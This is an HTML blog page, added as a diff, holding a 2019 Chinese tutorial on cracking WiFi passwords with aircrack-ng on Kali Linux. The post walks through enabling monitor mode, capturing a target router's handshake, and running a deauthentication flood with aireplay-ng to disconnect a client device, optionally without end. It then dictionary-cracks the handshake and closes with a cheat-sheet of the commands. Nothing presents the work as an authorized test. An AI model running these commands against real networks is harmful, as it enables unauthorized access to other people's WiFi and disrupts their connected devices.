@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>aircrack-ng 使用 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。 ) 输入 ifconfig -a 查看网卡，多了个 wlan0，说明网卡已经适配好，不然可能是驱动有问题。 ) 开启 monitor 模式，这里有些进程会影响到 monitor 模式的开启，如果开启成功可忽略，不然就依提示操作。 ) 按提示操作的结果： ) 监听">
+<meta property="og:type" content="article">
+<meta property="og:title" content="aircrack-ng 使用">
+<meta property="og:url" content="http://yoursite.com/2019/07/15/aircrack-ng%20%E7%A0%B4%E8%A7%A3%20wifi%20%E5%AF%86%E7%A0%81/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。 ) 输入 ifconfig -a 查看网卡，多了个 wlan0，说明网卡已经适配好，不然可能是驱动有问题。 ) 开启 monitor 模式，这里有些进程会影响到 monitor 模式的开启，如果开启成功可忽略，不然就依提示操作。 ) 按提示操作的结果： ) 监听">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_r.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_b.jpg">
+<meta property="og:image" content="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_r.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_r.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_b.jpg">
+<meta property="og:image" content="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_r.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_b.jpg">
+<meta property="og:image" content="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_r.jpg">
+<meta property="article:published_time" content="2019-07-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-09-12T11:15:58.252Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-aircrack-ng 破解 wifi 密码" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/15/aircrack-ng%20%E7%A0%B4%E8%A7%A3%20wifi%20%E5%AF%86%E7%A0%81/" class="article-date">
+  <time datetime="2019-07-14T16:00:00.000Z" itemprop="datePublished">2019-07-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      aircrack-ng 使用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>开始前，先连上无线网卡，因为虚拟机中的 kali 系统不用调用笔记本自带的无线网卡，所以需要一个外接无线网卡，然后接入 kali 系统。</strong></p>
+<p><img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-282f84d3711f5f0f80107357b6ea9e63_r.jpg" alt=""></p>
+<p><strong>输入 ifconfig -a 查看网卡，多了个 wlan0，说明网卡已经适配好，不然可能是驱动有问题。</strong></p>
+<p><img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-244b52656c458d9e1eaf474074dd81c0_r.jpg" alt=""></p>
+<p><strong>开启 monitor 模式，这里有些进程会影响到 monitor 模式的开启，如果开启成功可忽略，不然就依提示操作。</strong></p>
+<p><img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_b.jpg" alt="">)<img src="https://pic3.zhimg.com/v2-214844e51df46c46ef51cd26a6efe1aa_r.jpg" alt=""></p>
+<p><strong>按提示操作的结果：</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-d50efa944e052d3a939cc8bb50533bbd_r.jpg" alt=""></p>
+<p><strong>监听网络，完了 Ctrl+C 退出。</strong></p>
+<p>airodump-ng  wlan0mon</p>
+<p><img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-9f045e19c3cfd51a96f620026d59bc64_r.jpg" alt=""></p>
+<p><strong>主要参数说明：</strong></p>
+<p><strong>#BSSID ：路由器、AP 的 MAC 地址</strong></p>
+<p><strong># PWR ：信号强度，一看就是越小越强了</strong></p>
+<p><strong># #Data ：传输的数据大小，大的可能在下载或看视频什么的</strong></p>
+<p><strong># CH ：无线信道，要看准</strong></p>
+<p><strong># ENC ：加密协议，自 WPA2 协议爆出重大安全漏洞，现已经出 WPA3，坐等更新</strong></p>
+<p><strong># ESSID ：这个就不用多说了，wifi 名称，有中文可能会出现乱码哈</strong></p>
+<p><strong>3. 目标有了，开始对其进行 cap 包的监听和获取，这里要让其中连接的设备重连才能抓包其握手包，可以慢慢等待，也可以使用 deauth 洪水攻击。</strong></p>
+<p><strong>root@huan:~#airodump-ng -c 9 –bssid 78:11:DC:10:4F:66 -w /root / 桌面 / wuxianpj/handshake/wlan0mon</strong></p>
+<p><strong>// -w 后面的路径是存放握手包的</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-8ef33d2496a3682ad24f520df7e45bfd_r.jpg" alt=""></p>
+<p><strong>4. 另起窗口，我们用 deauth 洪水攻击，让其中的一台设备掉线，它掉线后会自动连接（除非别人在 wifi 设置中勾选掉了自动连接）</strong></p>
+<p><strong>root@huan:~#aireplay-ng -0 20 -c 6C:88:14:F2:47:8C -a 78:11:DC:10:4F:66 wlan0mon</strong></p>
+<p><strong>// -0 death 模式，20 为攻击次数，也可以设为 0，就是一直攻击</strong></p>
+<p><strong>// -c 这里自然就是连接上的某台设备的 MAC 地址了，指定它，我们让它稳稳地掉线。</strong></p>
+<p><img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_b.jpg" alt="">)<img src="https://pic2.zhimg.com/v2-2afbf0f05ef222c9697c14a3073042b5_r.jpg" alt=""></p>
+<p><strong>5. 看图，不废话</strong></p>
+<p><img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-f615825b330b1479a79c4b54685053d3_r.jpg" alt=""></p>
+<p><strong>6. 话不多说，上字典（关键东西），让它慢慢破去吧</strong></p>
+<p><strong>root@huan:~#aircrack-ng -w /root / 桌面 / wuxianpj/zidian/wordlist.txt /root / 桌面 / wuxianpj/handshake/-02.cap</strong></p>
+<p><img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_b.jpg" alt="">)<img src="https://pic4.zhimg.com/v2-11b58a2e1dbb87f268c4fd229f04e4ab_r.jpg" alt=""></p>
+<p><strong>7. 没错下一步操作，退出 monitor 模式，别忘了喔</strong></p>
+<p><img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_b.jpg" alt="">)<img src="https://pic1.zhimg.com/v2-117e73524259f4c8fa98e34f086a940c_r.jpg" alt=""></p>
+<p><strong>aircrack-ng 爆破 wifi 密码 – 命令清单</strong></p>
+<p><strong>~#airmon-ng start [网卡] // 开启 monitor 模式</strong></p>
+<p><strong>~#airodump-ng [网卡] // 捕获附件的 wifi 信息</strong></p>
+<p><strong>~#airodump-ng -c [信道]–bssid [路由器 MAC] -w [handshake-path] [网卡]</strong></p>
+<p><strong>~#aireplay-ng -0 [攻击次数值] -c [某连接设备 MAC] -a [路由器 MAC] [网卡]</strong></p>
+<p><strong>~#aircrack-ng -w [字典 - path] [破解的目标握手包 - path]</strong></p>
+<p><strong>~#airmon-ng stop [网卡] // 退出 monitor 模式</strong></p>
+<p>评论由作者筛选后显示</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/15/aircrack-ng%20%E7%A0%B4%E8%A7%A3%20wifi%20%E5%AF%86%E7%A0%81/" data-id="ck4zesbnq0000t8wvcvx30o8r" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/01/03/Mysql5.7%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Mysql5.7登录密码错误
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/15/Android%20Studio%20%E6%B7%BB%E5%8A%A0okhttp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Android Studio 添加 okhttp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/01/04/%E6%9F%A5%E7%9C%8BWindows%E7%AB%AF%E5%8F%A3/">查看Windows端口</a>
+          </li>
+        
+          <li>
+            <a href="/2020/01/04/windows%E5%8F%B3%E9%94%AE%E6%B7%BB%E5%8A%A0VS%20code/">windows右键添加VS code</a>
+          </li>
+        
+          <li>
+            <a href="/2020/01/04/MySQL%E4%BF%AE%E6%94%B9root%E5%AF%86%E7%A0%81%E7%9A%844%E7%A7%8D%E6%96%B9%E6%B3%95/">MySQL修改root密码的4种方法</a>
+          </li>
+        
+          <li>
+            <a href="/2020/01/04/android%20studio%20%E5%AF%BC%E5%85%A5%E5%85%B6%E4%BB%96%E9%A1%B9%E7%9B%AE%E5%B7%A5%E7%A8%8B%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%20-%20fan7983377%20%E7%9A%84%E5%8D%9A%E5%AE%A2%20-%20CSDN%20%E5%8D%9A%E5%AE%A2/">android studio 导入其他项目工程报错解决方法 - fan7983377 的博客 - CSDN 博客</a>
+          </li>
+        
+          <li>
+            <a href="/2020/01/03/Mysql5.7%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF/">Mysql5.7登录密码错误</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
